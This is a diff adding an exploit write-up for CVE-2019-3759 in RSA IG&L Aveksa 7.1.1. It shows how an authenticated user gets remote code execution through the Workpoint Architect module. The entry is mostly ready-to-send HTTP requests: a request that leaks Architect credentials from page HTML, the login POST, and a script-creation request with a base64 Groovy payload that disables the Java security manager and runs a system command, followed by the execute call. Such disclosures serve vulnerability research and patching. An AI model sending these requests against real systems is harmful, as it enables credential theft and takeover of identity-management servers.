@@ -1,0 +1,58 @@
+# Exploit Title: RSA IG&L Aveksa 7.1.1 - Remote Code Execution
+# Date: 2019-04-16
+# Exploit Author: Jakub Palaczynski, Lukasz Plonka
+# Vendor Homepage: https://www.rsa.com/
+# Version: 7.1.1, prior to P02 
+# CVE : CVE-2019-3759
+
+# (all vulnerable versions can be found at https://www.dell.com/support/security/pl-pl/details/DOC-106943/DSA-2019-134-RSA-Identity-Governance-and-Lifecycle-Product-Security-Update-for-Multiple-Vulnerabi)
+
+Information:
+Authenticated users can bypass authorization and get full access to Workpoint Architect module. This module gives possibility to run Groovy scripts which results in Code Execution.
+
+1. First user needs to learn username and password for Architect (different from Aveksa login). Sample request:
+https://AVEKSA_HOST/aveksa/main?Oid=193783&ReqType=GetPartial&PageID=ChangeRequestJobPageData&WFObjectID=1%3AWPDS&crID=193783&isAjax=false
+search for "<IFRAME" in source of HTML and note username and password
+
+2. Log into Architect. Sample request:
+POST /aveksaWFArchitect/auth/login/ HTTP/1.1
+Host: AVEKSA_HOST
+User-Agent: python
+wp-product-name: wp-architect
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 146
+Cookie: JSESSIONID=session
+Connection: close
+
+{"user":"USERNAME","password":"PASSWORD","dsn":"WPDS","product":{"name":"wp-architect","version":"4.40.16"}}
+
+3. Creating new script that bypasses Java Security Policy and runs "id" system command.
+* "statementText" - contains base64-encoded Groovy code
+* "name" (at the end) - script name that must be unique
+* Save "scriptId" from the response as it is necessary for next request.
+POST /aveksaWFArchitect/scripts/?refresh=true&replace=false&checkSyntax=false&saveWithRollbackVersion=false HTTP/1.1
+Host: AVEKSA_HOST
+User-Agent: python
+wp-product-name: wp-architect
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 733
+Cookie: JSESSIONID=session
+Connection: close
+
+{"statements":[{"scriptLineId":"-26:AUTOGEN","action":"insert","luDate":null,"luId":"","rowVersion":0,"sequence":1,"scriptClassId":17,"sourceName":"LOCAL","scriptId":"","name":"","validationStatus":0,"validationStatusMsg":"","statement":{"statementText":"U3lzdGVtLnNldFNlY3VyaXR5TWFuYWdlcihudWxsKTsKJ2lkJy5leGVjdXRlKCkudGV4dA==","statementJava":{"javaClass":"","ejb":false,"ejbVersion":"","jndiName":"","method":"","methodIsStatic":false,"returns":{"location":"system","name":""},"useInstance":false,"useInstanceObjectName":"","action":"insert"}}}],"scriptId":"-27:AUTOGEN","action":"insert","luDate":null,"luId":"","rowVersion":0,"name":"SCRIPTNAME","scriptTypeId":3,"validationStatus":0,"falseMsg":"","description":"","emitEvents":false,"errorText":"","saveMethod":"Architect"}
+
+4. Running created script:
+* In the response you have result of your command
+PUT /aveksaWFArchitect/scripts/execute/ HTTP/1.1
+Host: AVEKSA_HOST
+User-Agent: python
+wp-product-name: wp-architect
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 58
+Cookie: JSESSIONID=session
+Connection: close
+
+{"id":"SCRIPTID_OF_CREATED_SCRIPT","newTransaction":false,"symbolTable":{}}
